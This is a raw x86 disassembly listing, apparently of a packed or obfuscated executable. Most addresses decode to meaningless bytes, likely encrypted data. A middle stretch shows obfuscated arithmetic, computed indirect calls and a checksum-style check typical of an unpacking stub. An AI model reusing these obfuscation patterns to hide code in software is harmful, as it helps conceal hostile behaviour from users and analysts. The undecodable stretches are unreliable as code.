  40cc8a:	mov    ch,0x19
  40cc8c:	mov    WORD PTR [edx-0x25236026],ss
  40cc92:	mov    eax,ds:0x4dc56f99
  40cc97:	push   0xffffffe0
  40cc99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc9a:	or     BYTE PTR [ecx],0x75
  40cc9d:	test   al,0x91
  40cc9f:	jno    0x40cc46
  40cca1:	gs hlt 
  40cca3:	(bad)  [eax+ebx*1]
  40cca6:	enter  0x6f0c,0x71
  40ccaa:	push   ebx
  40ccab:	jmp    0x84146a7e
  40ccb0:	(bad)  
  40ccb1:	popf   
  40ccb2:	inc    esp
  40ccb3:	mov    dl,0xd6
  40ccb5:	sub    bl,cl
  40ccb7:	loopne 0x40ccf3
  40ccb9:	cwde   
  40ccba:	and    cl,bl
  40ccbc:	push   0xf542714b
  40ccc1:	mov    ah,0x2a
  40ccc3:	mov    DWORD PTR [ebp+0x37],edi
  40ccc6:	sbb    eax,0x30353f8
  40cccb:	icebp  
  40cccc:	and    BYTE PTR [edx+0x18],bh
  40cccf:	shl    ah,0xb8
  40ccd2:	jmp    0xd36e:0x3c134ef
  40ccd9:	daa    
  40ccda:	jl     0x40cc6d
  40ccdc:	mov    esp,0xcb9fa2d5
  40cce1:	(bad)  
  40cce2:	jecxz  0x40cc9f
  40cce4:	imul   esi,esp,0xffffffbf
  40cce7:	lea    ebx,[edi-0x22]
  40ccea:	xchg   ecx,eax
  40cceb:	clc    
  40ccec:	jnp    0x40ccaf
  40ccee:	mov    cl,0x40
  40ccf0:	pusha  
  40ccf1:	inc    esp
  40ccf2:	xchg   BYTE PTR [edx-0x1b],dh
  40ccf5:	jae    0x40cce1
  40ccf7:	imul   eax,DWORD PTR [esi+0xe74e740],0x85e8e681
  40cd01:	pop    eax
  40cd02:	call   0x69cd:0x11deabd8
  40cd09:	xchg   esi,eax
  40cd0a:	ja     0x40ccec
  40cd0c:	jmp    0x40ccb8
  40cd0e:	or     DWORD PTR [eax],edx
  40cd10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd11:	repz mov al,0x4a
  40cd14:	cmp    BYTE PTR [eax-0x4c],ah
  40cd17:	stc    
  40cd18:	pop    eax
  40cd19:	(bad)  
  40cd1b:	repnz daa 
  40cd1d:	push   ss
  40cd1e:	jle    0x40cd11
  40cd20:	jecxz  0x40cd08
  40cd22:	std    
  40cd23:	ds pop ds
  40cd25:	xchg   edi,eax
  40cd26:	daa    
  40cd27:	jp     0x40ccba
  40cd29:	in     al,dx
  40cd2a:	mov    esi,0x5a94f1a7
  40cd2f:	fstp   DWORD PTR [edi]
  40cd31:	pop    edi
  40cd32:	sbb    al,al
  40cd34:	ror    bl,1
  40cd36:	fsubr  DWORD PTR [esi]
  40cd38:	sbb    ah,cl
  40cd3a:	adc    al,0xe8
  40cd3c:	and    eax,0xcd1c7e8
  40cd41:	std    
  40cd42:	pop    ds
  40cd43:	mov    WORD PTR [ebx],fs
  40cd45:	xor    edx,DWORD PTR [edi+0x4c]
  40cd48:	adc    al,0x95
  40cd4a:	xlat   BYTE PTR ds:[ebx]
  40cd4b:	mov    dl,0xe
  40cd4d:	adc    eax,0x7d140389
  40cd52:	and    edx,edx
  40cd54:	shl    eax,0x38
  40cd57:	add    al,0x6a
  40cd59:	or     esi,ebp
  40cd5b:	(bad)  
  40cd5c:	sub    BYTE PTR [eax+0x7a4a790e],cl
  40cd62:	rcl    DWORD PTR [ecx-0xa6e00b],cl
  40cd68:	and    edx,DWORD PTR [edx+0xd]
  40cd6b:	mov    ecx,ebp
  40cd6d:	lahf   
  40cd6e:	xor    DWORD PTR [eax],ebx
  40cd70:	jecxz  0x40cd48
  40cd72:	jae    0x40cddf
  40cd74:	mov    esp,0x206752b9
  40cd79:	dec    esi
  40cd7a:	rol    ah,cl
  40cd7c:	push   DWORD PTR [ebx+0x22]
  40cd7f:	mov    BYTE PTR ds:0x5b21ea86,bh
  40cd85:	int    0xe4
  40cd87:	aaa    
  40cd88:	aaa    
  40cd89:	btr    DWORD PTR [edx-0x3207c317],esp
  40cd90:	cmp    dl,0x85
  40cd93:	lahf   
  40cd94:	push   edi
  40cd95:	leave  
  40cd96:	ficom  DWORD PTR [ebp-0x35]
  40cd99:	repnz cmp BYTE PTR [ebx+0x210489dd],bl
  40cda0:	xor    bl,BYTE PTR [ebp-0x69]
  40cda3:	into   
  40cda4:	sub    eax,0xa890277c
  40cda9:	idiv   BYTE PTR [esp+edi*4+0x45381aea]
  40cdb0:	push   esp
  40cdb1:	into   
  40cdb2:	lahf   
  40cdb3:	mov    ds:0x58b1b63b,eax
  40cdb8:	cwde   
  40cdb9:	add    edi,ebx
  40cdbb:	(bad)  
  40cdbc:	(bad)  
  40cdbd:	adc    ecx,DWORD PTR [esi+0x16]
  40cdc0:	add    BYTE PTR [esi-0x4c],ah
  40cdc3:	dec    ebx
  40cdc4:	pop    eax
  40cdc5:	mov    eax,0x13cd8a9
  40cdca:	xor    edi,0x6f76f99a
  40cdd0:	loopne 0x40cd60
  40cdd2:	sbb    esp,ecx
  40cdd4:	ror    BYTE PTR ds:0xc1f7afd2,0xa0
  40cddb:	xchg   esp,eax
  40cddc:	test   DWORD PTR [eax+0x153706e6],ebp
  40cde2:	adc    al,0xaf
  40cde4:	fcom   QWORD PTR [edi+0xa]
  40cde7:	pop    ebx
  40cde8:	ror    DWORD PTR [ebx+0x29],1
  40cdeb:	icebp  
  40cdec:	adc    bl,BYTE PTR [edi+0xba0d8d]
  40cdf2:	adc    dl,BYTE PTR [esi+0x46]
  40cdf5:	or     cl,al
  40cdf7:	mov    BYTE PTR [esi+0x21],ch
  40cdfa:	cmp    al,0x5f
  40cdfc:	mov    WORD PTR [ebx],?
  40cdfe:	add    ah,BYTE PTR [ebx-0x27]
  40ce01:	ja     0x40cddf
  40ce03:	fucom  st(2)
  40ce05:	push   esp
  40ce06:	std    
  40ce07:	push   ecx
  40ce08:	mov    ebx,0xb719e27c
  40ce0d:	div    DWORD PTR [ebx+0x7a]
  40ce10:	out    dx,eax
  40ce11:	pop    ss
  40ce12:	mov    ebp,DWORD PTR [eax+ecx*1+0x286df9bb]
  40ce19:	loope  0x40ce88
  40ce1b:	icebp  
  40ce1c:	sbb    BYTE PTR [edi],dh
  40ce1e:	aas    
  40ce1f:	loopne 0x40cdf4
  40ce21:	ins    BYTE PTR es:[edi],dx
  40ce22:	lods   al,BYTE PTR ds:[esi]
  40ce23:	xor    al,0xc0
  40ce25:	cwde   
  40ce26:	sbb    ebx,esi
  40ce28:	les    ecx,FWORD PTR [eax+0x72a3f540]
  40ce2e:	imul   ebx,DWORD PTR [esi+0xdd759c6],0xb6683483
  40ce38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce39:	push   eax
  40ce3a:	pop    eax
  40ce3b:	adc    ebx,ebx
  40ce3d:	leave  
  40ce3e:	sub    DWORD PTR [ecx+0x35],ebp
  40ce41:	test   ah,bl
  40ce43:	sbb    al,0x2d
  40ce45:	call   0x1009098f
  40ce4a:	test   BYTE PTR [ecx+0x0],dh
  40ce4d:	add    BYTE PTR [eax],al
  40ce4f:	mov    edi,DWORD PTR [ebp-0x14]
  40ce52:	mov    eax,DWORD PTR [ebp+0x8]
  40ce55:	mov    edx,DWORD PTR [ebp+0x14]
  40ce58:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40ce5c:	mov    ecx,0x7510893
  40ce61:	xor    edx,edx
  40ce63:	xor    edi,ecx
  40ce65:	mov    esi,0x3272db
  40ce6a:	add    edi,esi
  40ce6c:	div    edi
  40ce6e:	mov    edx,DWORD PTR [ebp-0x4]
  40ce71:	xor    edx,ecx
  40ce73:	lea    eax,[edx+eax*1+0x3272db]
  40ce7a:	mov    edx,DWORD PTR [ebp+0x8]
  40ce7d:	mov    edi,DWORD PTR [ebp-0x20]
  40ce80:	mov    DWORD PTR [edi+edx*4],eax
  40ce83:	mov    eax,DWORD PTR [ebp-0x14]
  40ce86:	mov    edx,DWORD PTR [ebp+0x8]
  40ce89:	xor    eax,ecx
  40ce8b:	lea    eax,[eax+edx*1+0x3272db]
  40ce92:	mov    DWORD PTR [ebp+0x8],eax
  40ce95:	mov    eax,DWORD PTR [ebp-0x14]
  40ce98:	mov    edx,DWORD PTR [ebp+0x14]
  40ce9b:	xor    eax,ecx
  40ce9d:	add    eax,esi
  40ce9f:	imul   eax,DWORD PTR [edx]
  40cea2:	mov    edx,DWORD PTR [ebp-0x4]
  40cea5:	xor    edx,ecx
  40cea7:	mov    ecx,DWORD PTR [ebp+0x8]
  40ceaa:	lea    ecx,[edx+ecx*1+0x3272db]
  40ceb1:	cmp    ecx,eax
  40ceb3:	jne    0x40ce4f
  40ceb9:	mov    eax,esi
  40cebb:	jmp    0x40cec5
  40cec0:	mov    eax,0x3272db
  40cec5:	mov    ebx,0x7510893
  40ceca:	mov    ecx,DWORD PTR [ebp-0x4]
  40cecd:	xor    ecx,ebx
  40cecf:	add    ecx,eax
  40ced1:	mov    DWORD PTR [ebp-0xc],ecx
  40ced4:	mov    ebx,0x3874
  40ced9:	add    ebx,0x2342
  40cedf:	xchg   ebx,esi
  40cee1:	xor    ebx,ebx
  40cee3:	push   esi
  40cee4:	mov    esi,ebx
  40cee6:	pop    ebx
  40cee7:	mov    edx,esi
  40cee9:	add    ebx,0x1002
  40ceef:	lea    eax,[ebp-0x10]
  40cef2:	add    edx,eax
  40cef4:	add    edx,0x5
  40cef7:	push   edx
  40cef8:	inc    esi
  40cef9:	pop    ecx
  40cefa:	dec    ecx
  40cefb:	xchg   ecx,eax
  40cefc:	dec    eax
  40cefd:	xchg   ecx,eax
  40cefe:	dec    ecx
  40ceff:	xchg   ecx,edx
  40cf01:	dec    edx
  40cf02:	push   edx
  40cf03:	mov    edx,ebx
  40cf05:	pop    ebx
  40cf06:	dec    ebx
  40cf07:	call   DWORD PTR [ebx]
  40cf09:	cmp    DWORD PTR [ebp+0x10],esi
  40cf0c:	je     0x40cf2b
  40cf12:	xchg   edx,eax
  40cf13:	push   0xb
  40cf15:	pop    ecx
  40cf16:	push   0x4
  40cf18:	pop    ebx
  40cf19:	inc    ebx
  40cf1a:	xchg   ebx,ecx
  40cf1c:	sub    ebx,ecx
  40cf1e:	xchg   ebx,ecx
  40cf20:	dec    ecx
  40cf21:	dec    ecx
  40cf22:	mov    eax,DWORD PTR [ebp-0x1c]
  40cf25:	imul   eax,ecx
  40cf28:	add    esp,eax
  40cf2a:	xchg   edx,eax
  40cf2b:	push   eax
  40cf2c:	xor    ebx,ebx
  40cf2e:	mov    edx,esp
  40cf30:	dec    edx
  40cf31:	inc    ebx
  40cf32:	add    ebx,DWORD PTR [edx+ebx*1]
  40cf35:	dec    ebx
  40cf36:	xor    edx,edx
  40cf38:	add    DWORD PTR [ebp-0xc],ebx
  40cf3b:	pop    ebx
  40cf3c:	mov    eax,DWORD PTR [ebp-0xc]
  40cf3f:	pop    edi
  40cf40:	pop    esi
  40cf41:	pop    ebx
  40cf42:	leave  
  40cf43:	ret    0x10
  40cf46:	or     DWORD PTR ds:0x42c00c,0x42a008
  40cf50:	xor    eax,eax
  40cf52:	add    DWORD PTR ds:0x428028,0x42a010
  40cf5c:	inc    eax
  40cf5d:	ret    
  40cf5e:	push   ebp
  40cf5f:	mov    ebp,esp
  40cf61:	mov    eax,ds:0x421c36
  40cf66:	and    DWORD PTR ds:0x42c008,0x0
  40cf70:	xor    ecx,ecx
  40cf72:	or     ecx,DWORD PTR ds:0x42c008
  40cf78:	inc    ecx
  40cf79:	mov    DWORD PTR ds:0x42c008,ecx
  40cf7f:	cmp    DWORD PTR ds:0x42c008,0xc
  40cf86:	jne    0x40cf9c
  40cf8c:	push   0x4238ba
  40cf91:	push   0x423872
  40cf96:	call   DWORD PTR ds:0x424030
  40cf9c:	cmp    DWORD PTR ds:0x42c008,0xb
  40cfa3:	jne    0x40cfb6
  40cfa9:	mov    ecx,DWORD PTR ds:0x42c008
  40cfaf:	inc    ecx
  40cfb0:	mov    DWORD PTR ds:0x42c008,ecx
  40cfb6:	cmp    DWORD PTR ds:0x42c008,0x1b
  40cfbd:	jb     0x40cf70
  40cfc3:	xor    ecx,DWORD PTR ds:0x42a01c
  40cfc9:	mov    eax,DWORD PTR [eax+0x1c8]
  40cfcf:	add    ecx,0x4e81
  40cfd5:	mov    eax,DWORD PTR [eax]
  40cfd7:	and    ecx,DWORD PTR ds:0x42b018
  40cfdd:	cdq    
  40cfde:	push   ebx
  40cfdf:	mov    ecx,0xfabdbef1
  40cfe4:	add    ebx,0x1541
  40cfea:	add    eax,ecx
  40cfec:	adc    edx,0xffffffff
  40cfef:	push   esi
  40cff0:	push   edi
  40cff1:	mov    edi,DWORD PTR ds:0x421a56
  40cff7:	mov    ebx,DWORD PTR ds:0x421a7e
  40cffd:	sub    edi,ebx
  40cfff:	or     edi,DWORD PTR [edi+ebx*1]
  40d002:	mov    edi,edx
  40d004:	and    DWORD PTR ds:0x429000,0x0
  40d00e:	jmp    0x40d020
  40d013:	mov    edx,DWORD PTR ds:0x429000
  40d019:	inc    edx
  40d01a:	mov    DWORD PTR ds:0x429000,edx
  40d020:	cmp    DWORD PTR ds:0x429000,0x1a
  40d027:	jae    0x40d079
  40d02d:	cmp    DWORD PTR ds:0x429000,0x7
  40d034:	jne    0x40d05a
  40d03a:	push   DWORD PTR [ebp-0x1c]
  40d03d:	push   0x85ec
  40d042:	push   0x4f88
  40d047:	push   DWORD PTR [ebp-0x10]
  40d04a:	push   0x6e2c
  40d04f:	push   0x428000
  40d054:	call   DWORD PTR ds:0x424038
  40d05a:	cmp    DWORD PTR ds:0x429000,0x6
  40d061:	jne    0x40d074
  40d067:	mov    edx,DWORD PTR ds:0x429000
  40d06d:	inc    edx
  40d06e:	mov    DWORD PTR ds:0x429000,edx
  40d074:	jmp    0x40d013
  40d079:	mov    edx,DWORD PTR [ebp+0x8]
  40d07c:	adc    DWORD PTR ds:0x42a00c,0x42801c
  40d086:	mov    ebx,eax
  40d088:	mov    eax,0x8a29a123
  40d08d:	xor    esi,esi
  40d08f:	xor    ebx,eax
  40d091:	xor    edi,0x0
  40d094:	and    DWORD PTR ds:0x429000,0x1a3f
  40d09e:	add    edx,ecx
  40d0a0:	adc    esi,0xffffffff
  40d0a3:	xor    edx,eax
  40d0a5:	xor    esi,0x0
  40d0a8:	cmp    edx,ebx
  40d0aa:	jne    0x40d0b8
  40d0b0:	cmp    esi,edi
  40d0b2:	je     0x40d0e7
  40d0b8:	mov    edx,DWORD PTR ds:0x421c36
  40d0be:	mov    edx,DWORD PTR [edx+0x1c0]
  40d0c4:	mov    edx,DWORD PTR [edx]
  40d0c6:	xor    esi,esi
  40d0c8:	add    edx,ecx
  40d0ca:	adc    esi,0xffffffff
  40d0cd:	xor    edx,eax
  40d0cf:	xor    esi,0x0
  40d0d2:	cmp    edx,0x70941fd1
  40d0d8:	jne    0x413c0d
  40d0de:	cmp    esi,0xffffffff
  40d0e1:	jne    0x413c0d
  40d0e7:	mov    edx,DWORD PTR ds:0x421cba
  40d0ed:	mov    esi,DWORD PTR ds:0x421cb2
  40d0f3:	xor    edx,esi
  40d0f5:	mov    DWORD PTR ds:0x421cb2,edx
  40d0fb:	mov    edx,DWORD PTR [ebp+0xc]
  40d0fe:	mov    edx,DWORD PTR [edx]
  40d100:	jmp    0x40f494
  40d105:	pop    ebp
  40d106:	xchg   edx,eax
  40d107:	add    DWORD PTR [ebx+0x6d],ebp
  40d10a:	imul   ebp,DWORD PTR [ebx-0x27d14c70],0xffffffcd
  40d111:	add    BYTE PTR [ebx-0x19],dh
  40d114:	add    eax,0x6262d1c2
  40d119:	jmp    0x40d17a
  40d11b:	bound  esp,QWORD PTR [edx-0x50]
  40d11e:	dec    esp
  40d11f:	mov    esi,0xf8e2f664
  40d124:	mov    edx,0x7a755438
  40d129:	daa    
  40d12a:	mov    al,ds:0xfcd25aef
  40d12f:	push   0x716ac5f3
  40d134:	xor    al,0xf0
  40d136:	inc    ebp
  40d137:	cld    
  40d138:	in     eax,0x33
  40d13a:	call   0x9d5e:0x1b3633b3
  40d141:	repnz jmp 0xcc7:0xabb9b824
  40d149:	in     eax,0xa5
  40d14b:	test   BYTE PTR [ebp-0xb],dl
  40d14e:	adc    dl,dh
  40d150:	clc    
  40d151:	add    al,0xc7
  40d153:	int3   
  40d154:	ins    BYTE PTR es:[edi],dx
  40d155:	xlat   BYTE PTR ds:[ebx]
  40d156:	out    dx,al
  40d157:	add    al,0xc9
  40d159:	jb     0x40d1cf
  40d15b:	xor    DWORD PTR [edi+0x5580ff85],ebp
  40d161:	inc    esi
  40d162:	add    eax,DWORD PTR cs:[ecx]
  40d165:	xor    al,0xca
  40d167:	xchg   BYTE PTR [ebp-0x6df54d38],bh
  40d16d:	push   ss
  40d16e:	xchg   esp,eax
  40d16f:	shr    BYTE PTR [esi+eax*1+0x6f],cl
  40d173:	sahf   
  40d174:	cmp    eax,0xe9401d5a
  40d179:	and    bl,BYTE PTR [ecx-0x5e28e4d9]
  40d17f:	jmp    0x444bada5
  40d184:	mov    bl,0x1c
  40d186:	in     eax,0x6a
  40d188:	dec    ebp
  40d189:	inc    eax
  40d18a:	dec    esp
  40d18b:	in     eax,0xe9
  40d18d:	pop    esi
  40d18e:	call   0x55991f5d
  40d193:	rcl    BYTE PTR [edx],0x55
  40d196:	xchg   esi,eax
  40d197:	add    ah,BYTE PTR ds:0x50e57990
  40d19d:	dec    ebx
  40d19e:	push   0xffffff87
  40d1a0:	mov    DWORD PTR [ebx+eax*2-0x2b],esi
  40d1a4:	lods   eax,DWORD PTR ds:[esi]
  40d1a5:	pushf  
  40d1a6:	jp     0x40d16b
  40d1a8:	in     al,0x3
  40d1aa:	dec    edx
  40d1ab:	div    BYTE PTR [ecx-0x6ba241ca]
  40d1b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d1b2:	pop    ss
  40d1b3:	in     eax,dx
  40d1b4:	mov    WORD PTR [ebx],es
  40d1b6:	add    DWORD PTR [eax-0x22],esi
  40d1b9:	hlt    
  40d1ba:	xor    al,0x5
  40d1bc:	or     al,BYTE PTR [ecx+0x2ff74eea]
  40d1c2:	test   edi,eax
  40d1c4:	cwde   
  40d1c5:	mov    ds:0xa82c524d,eax
  40d1ca:	idiv   DWORD PTR [ebp+0x6c]
  40d1cd:	cmova  edi,DWORD PTR ds:0xd407ccea
  40d1d4:	push   ss
  40d1d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1d6:	repnz pop esp
  40d1d8:	gs ret 0x8a09
  40d1dc:	mov    al,ch
  40d1de:	es test eax,0x910c5d43
  40d1e4:	or     eax,DWORD PTR [ecx-0x4428447b]
  40d1ea:	pop    ss
  40d1eb:	sub    al,cl
  40d1ed:	push   esi
  40d1ee:	(bad)  
  40d1ef:	retf   
  40d1f0:	and    eax,0x508ee1d4
  40d1f5:	test   al,0xe9
  40d1f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d1f8:	xchg   ebp,ebp
  40d1fa:	call   0xf04a:0x87707141
  40d201:	jp     0x40d241
  40d203:	add    al,0x80
  40d205:	or     eax,0x124be9bd
  40d20a:	or     ch,BYTE PTR ds:0xf86f3fa7
  40d210:	sub    al,0x2a
  40d212:	jp     0x40d1d9
  40d214:	loopne 0x40d1f8
  40d216:	dec    ebp
  40d217:	test   al,0xf0
  40d219:	ret    
  40d21a:	fs push edx
  40d21c:	mov    al,ds:0x1198aa15
  40d221:	inc    eax
  40d222:	or     BYTE PTR [edi+0x5],bl
  40d225:	cli    
  40d226:	dec    esp
  40d227:	stc    
  40d228:	imul   esp,DWORD PTR [edx+0x18bd40bb],0xffffffcc
  40d22f:	leave  
  40d230:	inc    edi
  40d231:	dec    esi
  40d232:	mov    al,ds:0x27d4adba
  40d237:	dec    eax
  40d238:	test   DWORD PTR [ecx+0x45],esp
  40d23b:	xor    cl,BYTE PTR [ebx]
  40d23d:	push   0x57
  40d23f:	mov    DWORD PTR [edi],edx
  40d241:	jmp    0x4796:0xf0d097dc
  40d248:	div    BYTE PTR [edi-0x31]
  40d24b:	jne    0x40d2c0
  40d24d:	into   
  40d24e:	push   cs
  40d24f:	dec    esi
  40d250:	xchg   BYTE PTR [ecx],cl
  40d252:	lds    eax,FWORD PTR [edx-0x76]
  40d255:	xor    ah,ah
  40d257:	arpl   bx,cx
  40d259:	ret    
  40d25a:	pop    ds
  40d25b:	adc    ecx,DWORD PTR [edx-0x9]
  40d25e:	int3   
  40d25f:	mov    ecx,esi
  40d261:	test   eax,0xd4c8d9e5
  40d266:	cmp    BYTE PTR ds:[ecx+0xc31baa],ch
  40d26d:	jecxz  0x40d269
  40d26f:	leave  
  40d270:	fisub  WORD PTR [edx+ebp*4-0xa]
  40d274:	arpl   si,di
  40d276:	aas    
  40d277:	mov    al,0x68
  40d279:	mov    dl,0x24
  40d27b:	jle    0x40d2ce
  40d27d:	lea    edi,[esi+0x44]
  40d280:	stos   BYTE PTR es:[edi],al
  40d281:	jne    0x40d24e
  40d283:	and    eax,0xe6c3ac86
  40d288:	neg    DWORD PTR [ebx+0x7c]
  40d28b:	adc    al,0x2
  40d28d:	addr16 and eax,0x73a780b9
  40d293:	aas    
  40d294:	jmp    0x40d2e0
  40d296:	inc    eax
  40d297:	and    esp,esi
  40d299:	shl    WORD PTR [ebp+0x68],1
  40d29d:	sbb    al,bh
  40d29f:	add    DWORD PTR [ebx-0x2341003e],eax
  40d2a5:	and    esi,0xffffffc4
  40d2a8:	and    ah,bh
  40d2aa:	jno    0x40d2e8
  40d2ac:	dec    esi
  40d2ad:	or     ch,BYTE PTR [ecx+0x2c]
  40d2b0:	into   
  40d2b1:	dec    edx
  40d2b2:	(bad)  
  40d2b3:	mov    cl,0x2b
  40d2b5:	das    
  40d2b6:	data16 mov ds:0x9fe04936,al
  40d2bc:	mov    al,ds:0xf9e57e3
  40d2c1:	or     esp,DWORD PTR [ecx+0x72647a0c]
  40d2c7:	cli    
  40d2c8:	fnsave [esi]
  40d2ca:	xor    esi,DWORD PTR [edx]
  40d2cc:	out    dx,eax
  40d2cd:	(bad)  
  40d2ce:	(bad)  
  40d2cf:	jns    0x40d282
  40d2d1:	xor    BYTE PTR [edx+ecx*2+0x51c463a7],cl
  40d2d8:	mov    BYTE PTR [esi],0x30
  40d2db:	or     eax,0x809a4ccc
  40d2e0:	pop    ds
  40d2e1:	dec    esi
  40d2e2:	mov    ebx,0xf33b522d
  40d2e7:	adc    ch,BYTE PTR [ecx]
  40d2e9:	push   esp
  40d2ea:	mov    al,0x73
  40d2ec:	push   ds
  40d2ed:	pop    edi
  40d2ee:	mov    ds:0x493db875,eax
  40d2f3:	xchg   BYTE PTR [eax-0x5],ch
  40d2f6:	rcl    BYTE PTR [ebp-0x3c],cl
  40d2f9:	repz adc DWORD PTR [ebx+0x135b8ff6],0xffffffc1
  40d301:	dec    esp
  40d302:	push   0xe523f874
  40d307:	cmp    ebx,ebp
  40d309:	je     0x40d32d
  40d30b:	jl     0x40d32b
  40d30d:	push   edx
  40d30e:	and    eax,ebp
  40d310:	out    0xc0,al
  40d312:	mov    BYTE PTR [ecx+0x48],cl
  40d315:	inc    esi
  40d316:	adc    eax,0x8fad6705
  40d31b:	xor    edx,DWORD PTR [esi+0x2e]
  40d31e:	pop    ecx
  40d31f:	test   bh,ah
  40d321:	dec    edx
  40d322:	les    ebx,FWORD PTR [ebx+0x18fd158c]
  40d328:	out    dx,al
  40d329:	xor    bh,BYTE PTR [edi-0x38]
  40d32c:	aaa    
  40d32d:	leave  
  40d32e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d32f:	cmp    BYTE PTR [eax-0x5a8e90b4],ah
  40d335:	sub    eax,0xfc49ef6d
  40d33a:	(bad)  
  40d33b:	xchg   esp,eax
  40d33c:	fmul   QWORD PTR [esi-0x30]
  40d33f:	ins    BYTE PTR es:[edi],dx
  40d340:	sub    ch,BYTE PTR [edx+ebp*1-0x41]
  40d344:	pop    ds
  40d345:	push   ecx
  40d346:	stos   BYTE PTR es:[edi],al
  40d347:	aam    0x8b
  40d349:	hlt    
  40d34a:	outs   dx,DWORD PTR ds:[esi]
  40d34b:	push   edx
  40d34c:	daa    
  40d34d:	cmp    BYTE PTR [edx-0x79],bl
  40d350:	retf   
  40d351:	es test al,0xb8
  40d354:	ins    BYTE PTR es:[edi],dx
  40d355:	jmp    0xf45f:0x6a7684c6
  40d35c:	inc    cx
  40d35e:	add    DWORD PTR [ebp+0x1ff51f70],ebx
  40d364:	push   eax
  40d365:	pop    ecx
  40d366:	sar    DWORD PTR [ebp-0x734abae9],0x19
  40d36d:	pushf  
  40d36e:	data16 sbb ah,cl
  40d371:	sub    eax,0xda95ccc9
  40d376:	je     0x40d31d
  40d378:	jecxz  0x40d38d
  40d37a:	ja     0x40d392
  40d37c:	push   esi
  40d37d:	inc    ecx
  40d37e:	shl    BYTE PTR [esi+0x1203b41],1
  40d384:	in     al,dx
  40d385:	call   0x18c9:0x46f6add7
  40d38c:	push   esi
  40d38d:	les    eax,FWORD PTR [edx+0x59]
  40d390:	push   0xf7860c3d
  40d395:	xchg   ecx,eax
  40d396:	out    0xee,eax
  40d398:	hlt    
  40d399:	push   esi
  40d39a:	push   edi
  40d39b:	xchg   BYTE PTR [eax-0x59009963],dl
  40d3a1:	cs in  al,0xbe
  40d3a4:	stc    
  40d3a5:	addr16 cdq 
  40d3a7:	into   
  40d3a8:	pop    eax
  40d3a9:	push   cs
  40d3aa:	fsubp  st(0),st
  40d3ac:	pop    eax
  40d3ad:	int3   
  40d3ae:	pop    ebp
  40d3af:	inc    ecx
  40d3b0:	mov    edi,0x2a5a49fe
  40d3b5:	and    dh,cl
  40d3b7:	xchg   DWORD PTR [eax],ecx
  40d3b9:	add    al,0xc5
  40d3bb:	and    cl,BYTE PTR [edx]
  40d3bd:	outs   dx,DWORD PTR ds:[esi]
  40d3be:	in     al,dx
  40d3bf:	jae    0x40d3ab
  40d3c1:	sub    DWORD PTR [esi],ebx
  40d3c3:	les    edi,FWORD PTR [edx+0x48]
  40d3c6:	adc    DWORD PTR ss:[ebp+0x2f51d1a1],0xffffffc1
  40d3ce:	mov    cl,BYTE PTR [eax-0x7e]
  40d3d1:	adc    al,0x35
  40d3d3:	push   ecx
  40d3d4:	in     al,dx
  40d3d5:	cmp    edi,DWORD PTR [ebp+0x33df3e51]
  40d3db:	cmp    DWORD PTR [eax+0x57fc2234],0x20d88826
  40d3e5:	pop    edx
  40d3e6:	jb     0x40d3cc
  40d3e8:	adc    al,bl
  40d3ea:	or     al,0xce
  40d3ec:	popf   
  40d3ed:	stos   DWORD PTR es:[edi],eax
  40d3ee:	(bad)  
  40d3ef:	in     eax,dx
  40d3f0:	outs   dx,BYTE PTR fs:[esi]
  40d3f2:	push   0xfffffff1
  40d3f4:	lods   al,BYTE PTR ds:[esi]
  40d3f5:	adc    eax,0x640dc5de
  40d3fa:	sub    eax,DWORD PTR [ecx+0x74]
  40d3fd:	mov    BYTE PTR [edx-0x2c31ecef],bh
  40d403:	mov    al,ds:0x2b22fe5f
  40d408:	mov    dh,dl
  40d40a:	cmp    al,0xef
  40d40c:	loopne 0x40d3f5
  40d40e:	mov    eax,gs:0x680caa0d
  40d414:	xchg   edi,eax
  40d415:	sub    BYTE PTR [ecx],bl
  40d417:	add    DWORD PTR [eax-0x75],esi
  40d41a:	retf   
  40d41b:	jl     0x40d3df
  40d41d:	jmp    0xb7da:0xb367e34f
  40d424:	or     DWORD PTR [edx+0x497e3e00],esi
  40d42a:	add    al,0x47
  40d42c:	sbb    ch,BYTE PTR [ecx-0x4c]
  40d42f:	jl     0x40d420
  40d431:	ins    DWORD PTR es:[edi],dx
  40d432:	inc    ecx
  40d433:	daa    
  40d434:	sub    BYTE PTR [ebx-0x11],cl
  40d437:	mov    ds:0x12105d62,al
  40d43c:	leave  
  40d43d:	jl     0x40d4bb
  40d43f:	cdq    
  40d440:	loop   0x40d4a2
  40d442:	cdq    
  40d443:	add    ebx,DWORD PTR [edi-0x4e71d0d6]
  40d449:	push   edi
  40d44a:	or     DWORD PTR ss:[esi],edi
  40d44d:	xchg   edx,eax
  40d44e:	std    
  40d44f:	mov    DWORD PTR [edi+0x3b29ba62],ebx
  40d455:	add    al,0x70
  40d457:	or     DWORD PTR [ecx-0xe],ecx
  40d45a:	mov    dh,BYTE PTR [esi]
  40d45c:	inc    DWORD PTR [ecx-0x4b]
  40d45f:	repz jnp 0x40d446
  40d462:	rcl    bh,cl
  40d464:	enter  0xcb52,0x0
  40d468:	mov    eax,0x6c81a5a5
  40d46d:	adc    DWORD PTR [eax+0x21],edi
  40d470:	outs   dx,BYTE PTR ds:[esi]
  40d471:	in     eax,0x5b
  40d473:	(bad)  
  40d474:	jmp    0x610655b5
  40d479:	retf   0xd749
  40d47c:	fsubr  st,st(4)
  40d47e:	cmc    
  40d47f:	out    dx,al
  40d480:	test   DWORD PTR [ebx-0x4],ecx
  40d483:	dec    ebp
  40d484:	mov    ebp,DWORD PTR [esp+eiz*4+0x64684568]
  40d48b:	loop   0x40d45e
  40d48d:	(bad)  
  40d48e:	mov    al,ds:0x6471ca53
  40d493:	out    dx,al
  40d494:	sub    cl,BYTE PTR [ebx]
  40d496:	scas   al,BYTE PTR es:[edi]
  40d497:	clc    
  40d498:	pop    es
  40d499:	inc    esp
  40d49a:	xor    al,BYTE PTR ds:0x9c39dfac
  40d4a0:	dec    ebp
  40d4a1:	clc    
  40d4a2:	(bad)  
  40d4a3:	mov    dl,0x89
  40d4a5:	rol    edi,1
  40d4a7:	mov    ah,BYTE PTR [ebx]
